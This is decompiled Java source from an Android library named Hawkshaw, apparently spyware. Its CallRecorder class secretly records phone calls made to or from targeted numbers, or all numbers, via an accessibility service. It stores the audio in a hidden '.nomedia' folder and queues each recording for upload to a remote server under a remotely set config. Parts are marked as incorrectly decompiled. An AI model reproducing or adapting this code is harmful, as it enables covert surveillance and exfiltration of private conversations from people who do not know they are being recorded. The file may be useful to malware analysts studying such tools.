package com.hawkshaw.library.features.telephony;

import N1.h;
import W2.e;
import W2.l;
import Y1.J;
import Y1.K;
import a3.j;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import com.hawkshaw.library.App;
import com.hawkshaw.library.config.DynamicConfigKt;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.datalayer.models.DynamicConfig;
import com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity;
import com.hawkshaw.library.features.accessibility.MainAccessibilityService;
import com.hawkshaw.library.features.media.MediaService;
import com.hawkshaw.library.features.media.filecrud.FileUploadKt;
import com.hawkshaw.library.ktextensions.CoroutineKt;
import com.hawkshaw.library.logger.Logger;
import i.C0528x;
import j3.f;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Locale;
import me.pushy.sdk.lib.jackson.databind.a;
import t3.N;

public final class CallRecorder {
    public static final Companion Companion = new Companion((f) null);
    private static final String FILENAME_FORMAT = "yyyy-MM-dd-HH-mm-ss-SSS";
    private static final String TAG = "CallRecorder";
    /* access modifiers changed from: private */
    public final Context context;
    private final e mr$delegate = new l(new f(this));
    private final String phoneNumber;

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(f fVar) {
            this();
        }

        /* access modifiers changed from: private */
        /* JADX WARNING: Removed duplicated region for block: B:12:0x0031  */
        /* JADX WARNING: Removed duplicated region for block: B:17:0x0050 A[RETURN] */
        /* JADX WARNING: Removed duplicated region for block: B:18:0x0051  */
        /* JADX WARNING: Removed duplicated region for block: B:8:0x0021  */
        /* Code decompiled incorrectly, please refer to instructions dump. */
        public final java.lang.Object getMatch(java.lang.String r8, a3.e r9) {
            
                r7 = this;
                boolean r0 = r9 instanceof com.hawkshaw.library.features.telephony.d
                if (r0 == 0) goto L_0x0013
                r0 = r9
                com.hawkshaw.library.features.telephony.d r0 = (com.hawkshaw.library.features.telephony.d) r0
                int r1 = r0.f5027G
                r2 = -2147483648(0xffffffff80000000, float:-0.0)
                r3 = r1 & r2
                if (r3 == 0) goto L_0x0013
                int r1 = r1 - r2
                r0.f5027G = r1
                goto L_0x0018
            L_0x0013:
                com.hawkshaw.library.features.telephony.d r0 = new com.hawkshaw.library.features.telephony.d
                r0.<init>(r7, r9)
            L_0x0018:
                java.lang.Object r9 = r0.f5025E
                b3.a r1 = b3.C0298a.f4140D
                int r2 = r0.f5027G
                r3 = 1
                if (r2 == 0) goto L_0x0031
                if (r2 != r3) goto L_0x0029
                java.lang.String r8 = r0.f5024D
                Y1.C0110h.P(r9)
                goto L_0x0047
            L_0x0029:
                java.lang.IllegalStateException r8 = new java.lang.IllegalStateException
                java.lang.String r9 = "call to 'resume' before 'invoke' with coroutine"
                r8.<init>(r9)
                throw r8
            L_0x0031:
                Y1.C0110h.P(r9)
                com.hawkshaw.library.datalayer.room.AppDatabase r9 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
                com.hawkshaw.library.datalayer.room.telephony.TelephonyDao r9 = r9.telephonyDao()
                r0.f5024D = r8
                r0.f5027G = r3
                java.lang.Object r9 = r9.getCallRecordNumbers(r0)
                if (r9 != r1) goto L_0x0047
                return r1
            L_0x0047:
                java.util.List r9 = (java.util.List) r9
                boolean r0 = r9.isEmpty()
                r1 = 0
                if (r0 == 0) goto L_0x0051
                return r1
            L_0x0051:
                s1.c r0 = s1.c.d()
                java.lang.Iterable r9 = (java.lang.Iterable) r9
                java.util.Iterator r9 = r9.iterator()
            L_0x005b:
                boolean r2 = r9.hasNext()
                if (r2 == 0) goto L_0x0083
                java.lang.Object r2 = r9.next()
                r4 = r2
                com.hawkshaw.library.datalayer.room.telephony.CallRecordEntity r4 = (com.hawkshaw.library.datalayer.room.telephony.CallRecordEntity) r4
                java.lang.String r5 = r4.getName()
                java.lang.String r6 = "HAWKSHAW_ALL"
                boolean r5 = Y1.K.f(r5, r6)
                if (r5 == 0) goto L_0x0075
                goto L_0x0082
            L_0x0075:
                java.lang.String r4 = r4.getNumber()
                int r4 = r0.g(r4, r8)
                r5 = 2
                if (r4 == r5) goto L_0x005b
                if (r4 == r3) goto L_0x005b
            L_0x0082:
                r1 = r2
            L_0x0083:
                return r1
            
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.telephony.CallRecorder.Companion.getMatch(java.lang.String, a3.e):java.lang.Object");
        }

        private final void startCallRecording(String str) {
            App.Companion companion = App.Companion;
            Intent intent = new Intent(companion.getContext(), MainAccessibilityService.class);
            intent.putExtra("call_recorder", true);
            intent.putExtra("type", "StartCallRecording");
            intent.putExtra("phone_number", str);
            companion.getContext().startService(intent);
        }

        private final void stopCallRecording() {
            App.Companion companion = App.Companion;
            Intent intent = new Intent(companion.getContext(), MainAccessibilityService.class);
            intent.putExtra("call_recorder", true);
            intent.putExtra("type", "StopCallRecording");
            companion.getContext().startService(intent);
        }

        /* JADX WARNING: Removed duplicated region for block: B:12:0x0035  */
        /* JADX WARNING: Removed duplicated region for block: B:8:0x0021  */
        /* Code decompiled incorrectly, please refer to instructions dump. */
        public final java.lang.Object onCallStateChanged$library_release(int r5, java.lang.String r6, boolean r7, a3.e r8) {
            
                r4 = this;
                boolean r0 = r8 instanceof com.hawkshaw.library.features.telephony.e
                if (r0 == 0) goto L_0x0013
                r0 = r8
                com.hawkshaw.library.features.telephony.e r0 = (com.hawkshaw.library.features.telephony.e) r0
                int r1 = r0.f5033I
                r2 = -2147483648(0xffffffff80000000, float:-0.0)
                r3 = r1 & r2
                if (r3 == 0) goto L_0x0013
                int r1 = r1 - r2
                r0.f5033I = r1
                goto L_0x0018
            L_0x0013:
                com.hawkshaw.library.features.telephony.e r0 = new com.hawkshaw.library.features.telephony.e
                r0.<init>(r4, r8)
            L_0x0018:
                java.lang.Object r8 = r0.f5031G
                b3.a r1 = b3.C0298a.f4140D
                int r2 = r0.f5033I
                r3 = 1
                if (r2 == 0) goto L_0x0035
                if (r2 != r3) goto L_0x002d
                boolean r7 = r0.f5030F
                java.lang.String r6 = r0.f5029E
                com.hawkshaw.library.features.telephony.CallRecorder$Companion r5 = r0.f5028D
                Y1.C0110h.P(r8)
                goto L_0x004e
            L_0x002d:
                java.lang.IllegalStateException r5 = new java.lang.IllegalStateException
                java.lang.String r6 = "call to 'resume' before 'invoke' with coroutine"
                r5.<init>(r6)
                throw r5
            L_0x0035:
                Y1.C0110h.P(r8)
                if (r5 == 0) goto L_0x0056
                r8 = 2
                if (r5 == r8) goto L_0x003e
                goto L_0x0059
            L_0x003e:
                r0.f5028D = r4
                r0.f5029E = r6
                r0.f5030F = r7
                r0.f5033I = r3
                java.lang.Object r8 = r4.getMatch(r6, r0)
                if (r8 != r1) goto L_0x004d
                return r1
            L_0x004d:
                r5 = r4
            L_0x004e:
                if (r8 == 0) goto L_0x0059
                if (r7 != 0) goto L_0x0059
                r5.startCallRecording(r6)
                goto L_0x0059
            L_0x0056:
                r4.stopCallRecording()
            L_0x0059:
                W2.y r5 = W2.y.f2418a
                return r5
            
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.telephony.CallRecorder.Companion.onCallStateChanged$library_release(int, java.lang.String, boolean, a3.e):java.lang.Object");
        }
    }

    public CallRecorder(Context context2, String str) {
        K.n(context2, "context");
        this.context = context2;
        this.phoneNumber = str;
    }

    private final MediaRecorder getMr() {
        return (MediaRecorder) this.mr$delegate.getValue();
    }

    private final File getOutputFile(String str) {
        File externalFilesDir = this.context.getExternalFilesDir(".call-recordings");
        if (externalFilesDir == null) {
            externalFilesDir = Environment.getExternalStoragePublicDirectory(".call-recordings");
        }
        if (!externalFilesDir.exists()) {
            externalFilesDir.mkdirs();
        }
        File file = new File(externalFilesDir, ".nomedia");
        if (!file.exists()) {
            file.createNewFile();
        }
        String format = new SimpleDateFormat(FILENAME_FORMAT, Locale.getDefault()).format(Long.valueOf(System.currentTimeMillis()));
        String str2 = this.phoneNumber;
        if (str2 == null) {
            str2 = "";
        }
        return new File(externalFilesDir, C0528x.f("call_recording_", str2, "_", format, str));
    }

    /* access modifiers changed from: private */
    public static final void startRecording$lambda$0(CallRecorder callRecorder, MediaRecorder mediaRecorder, int i5, int i6) {
        K.n(callRecorder, "this$0");
        Logger.e$default(Logger.INSTANCE, TAG, a.g("Media Recorder Error: What ", i5, ", Extra ", i6), (Exception) null, false, 12, (Object) null);
        callRecorder.stopRecording();
    }

    /* access modifiers changed from: private */
    public static final void startRecording$lambda$1(CallRecorder callRecorder, MediaRecorder mediaRecorder, int i5, int i6) {
        K.n(callRecorder, "this$0");
        Logger.d$default(Logger.INSTANCE, TAG, a.g("Media Recorder Info: What ", i5, ", Extra ", i6), false, 4, (Object) null);
        if (i5 == 800) {
            callRecorder.stopRecording();
        }
    }

    public final void startRecording() {
        try {
            DynamicConfig.CallRecorder callRecorder = DynamicConfigKt.getDynamicConfig().getCallRecorder();
            File outputFile = getOutputFile(callRecorder.getOutputFileExtension());
            getMr().setAudioSource(callRecorder.getAudioSource());
            getMr().setOutputFormat(callRecorder.getOutputFormat());
            getMr().setAudioEncoder(callRecorder.getAudioEncoder());
            getMr().setAudioEncodingBitRate(callRecorder.getAudioEncodingBitRate());
            getMr().setAudioSamplingRate(callRecorder.getAudioSamplingRate());
            getMr().setOutputFile(outputFile);
            getMr().setMaxDuration(callRecorder.getMaxDurationMs());
            getMr().setOnErrorListener(new c(this));
            getMr().setOnInfoListener(new h(this, 1));
            getMr().prepare();
            getMr().start();
            Logger logger = Logger.INSTANCE;
            String path = outputFile.getPath();
            Logger.v$default(logger, TAG, "Call recording started, " + path, false, 4, (Object) null);
            String path2 = outputFile.getPath();
            K.m(path2, "getPath(...)");
            CoroutineKt.safeLaunch$default(J.a(N.f9292c), (j) null, new g(new PushFileTaskEntity(path2, Command.FileRequest.Source.CallRecording, callRecorder.getFileUploadMedium(), 0, 0, 0, 0, 0, 248, (f) null), (a3.e) null), 1, (Object) null);
        } catch (Exception e5) {
            Logger.e$default(Logger.INSTANCE, TAG, C0528x.h("Call recording error, ", e5.getMessage()), (Exception) null, false, 12, (Object) null);
            e5.printStackTrace();
        }
    }

    public final void stopRecording() {
        try {
            MediaService.Companion.stopService$library_release();
            getMr().stop();
            getMr().release();
            Logger.v$default(Logger.INSTANCE, TAG, "Call recording stopped", false, 4, (Object) null);
            FileUploadKt.startPushFileService();
        } catch (Exception e5) {
            Logger.e$default(Logger.INSTANCE, TAG, C0528x.h("Call recording stop error, ", e5.getMessage()), (Exception) null, false, 12, (Object) null);
        }
    }
}
